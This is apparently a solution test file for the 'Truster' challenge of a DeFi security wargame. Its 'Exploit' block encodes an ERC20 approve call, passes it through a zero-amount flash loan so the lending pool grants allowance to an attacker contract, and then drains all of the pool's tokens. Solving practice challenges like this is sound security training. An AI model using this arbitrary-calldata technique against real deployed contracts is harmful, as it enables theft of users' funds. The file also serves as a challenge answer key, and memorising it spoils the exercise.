const { ether } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');
const TransfererAttacker = contract.fromArtifact('TransfererAttacker');

const { expect } = require('chai');

describe('[Challenge] Truster', function () {

    const [deployer, attacker, ...otherAccounts] = accounts;

    const TOKENS_IN_POOL = ether('1000000');

    before(async function () {
        /** SETUP SCENARIO */
        this.token = await DamnValuableToken.new({ from: deployer });
        this.pool = await TrusterLenderPool.new(this.token.address, { from: deployer });

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal('0');
    });

    it('Exploit', async function () {
        /** Borrow 0, approve attacker to spend tokens */
        this.attackerContract = await TransfererAttacker.new(this.token.address, this.pool.address, {from: attacker});
        const callData = web3.eth.abi.encodeFunctionCall({
            name: 'approve',
            type: 'function',
            inputs: [{
                type: 'address',
                name: 'spender'
            },{
                type: 'uint256',
                name: 'amount'
            }]
          }, [this.attackerContract.address, TOKENS_IN_POOL.toString()]);
        console.log("calldata: ", callData);
        await this.pool.flashLoan(0, attacker, this.token.address, callData);
        await this.attackerContract.attack(TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal('0');
    });
});
